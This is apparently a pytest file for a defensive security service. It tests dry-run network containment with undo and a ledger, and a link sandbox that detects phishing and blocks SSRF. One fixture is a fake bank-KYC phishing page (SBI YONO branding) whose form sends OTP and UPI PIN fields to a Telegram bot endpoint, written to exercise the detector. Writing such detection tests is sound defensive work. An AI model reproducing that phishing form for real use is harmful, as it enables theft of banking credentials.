"""Tests for Reversible Containment Ladder (dry-run + protected hosts + Undo + SCI ledger)
and Opt-in Isolated Link Sandbox (offline HTML inspection + SSRF protection + offline gate)."""
from __future__ import annotations

from fastapi.testclient import TestClient

from app.config import settings
from app.detectors.link_sandbox import analyze_html_snapshot, inspect_url_sandbox
from app.main import app


def test_containment_dry_run_apply_undo_and_protected_host(monkeypatch):
    client = TestClient(app)
    monkeypatch.setattr(settings, "api_token", "")
    monkeypatch.setattr(settings, "containment_dry_run", True)

    # Protected loopback host must NEVER be auto-contained
    r_prot = client.post(
        "/api/containment/contain",
        json={"action": "drop_ip", "target": "127.0.0.1", "ttl_seconds": 600, "actor": "pytest"},
    )
    assert r_prot.status_code == 200
    assert r_prot.json()["status"] == "needs_owner_approval"
    assert r_prot.json()["blocked_by_safeguard"] is True

    # Dry-run sinkhole_domain succeeds & writes to SHA-256 SCI ledger
    r_ok = client.post(
        "/api/containment/contain",
        json={"action": "sinkhole_domain", "target": "sim-sbi-kyc.test", "ttl_seconds": 600, "actor": "pytest"},
    )
    assert r_ok.status_code == 200
    d = r_ok.json()
    assert d["dry_run"] is True
    assert d["status"] == "dry_run_recorded"
    assert d["sci_incident_id"].startswith("SCI-")
    assert any("sim-sbi-kyc.test" in c for c in d["apply_commands"])
    assert any("rm -f" in c for c in d["undo_commands"])

    # Undo reverses cleanly & verifies SHA-256 chain
    r_undo = client.post(f"/api/containment/undo/{d['action_id']}?actor=pytest")
    assert r_undo.status_code == 200
    u = r_undo.json()
    assert u["status"] == "undone"
    assert u["undo_sci_incident_id"].startswith("SCI-")

    assert client.get("/api/sci/ledger/verify").json()["valid"] is True

    # Auth enforcement check on containment endpoint
    monkeypatch.setattr(settings, "api_token", "top-secret-token")
    r_unauth = client.post(
        "/api/containment/contain",
        json={"action": "drop_ip", "target": "203.0.113.77", "ttl_seconds": 300},
    )
    assert r_unauth.status_code == 401


def test_link_sandbox_offline_html_catches_telegram_exfil_and_brand_spoof(monkeypatch):
    client = TestClient(app)
    monkeypatch.setattr(settings, "sandbox_enabled", False)

    # Live network fetch strictly blocked in default offline mode
    r_off = client.post("/api/url/sandbox", json={"url": "https://example.com", "allow_network": True})
    assert r_off.status_code == 403

    # Offline HTML snapshot inspection catches SBI brand spoof + OTP/password + Telegram bot exfil
    fake_html = """
    <html><head><title>SBI YONO KYC Verification Portal</title></head>
    <body>
      <form action="https://api.telegram.org/bot99887766:AAFakeToken/sendMessage">
        <input type="text" name="otp" placeholder="Enter 6-digit OTP" />
        <input type="password" name="mpin" placeholder="Enter UPI PIN" />
      </form>
    </body></html>
    """
    r_snap = client.post(
        "/api/url/sandbox",
        json={"url": "http://sbi-kyc-update.top/verify", "html_content": fake_html},
    )
    assert r_snap.status_code == 200
    res = r_snap.json()
    assert res["mode"] == "offline_html_snapshot"
    assert res["telegram_exfil_detected"] is True
    assert res["has_password_input"] is True
    assert res["sandbox_risk_score"] >= 80
    codes = {f["code"] for f in res["findings"]}
    assert "SANDBOX_TELEGRAM_BOT_EXFIL" in codes
    assert "SANDBOX_BRAND_IMPERSONATION" in codes


def test_link_sandbox_ssrf_blocks_private_ip(monkeypatch):
    monkeypatch.setattr(settings, "sandbox_enabled", True)
    try:
        inspect_url_sandbox("http://192.168.1.1/admin", allow_network=True)
        assert False, "Expected ValueError for private IP"
    except ValueError as exc:
        assert "SSRF safeguard" in str(exc)
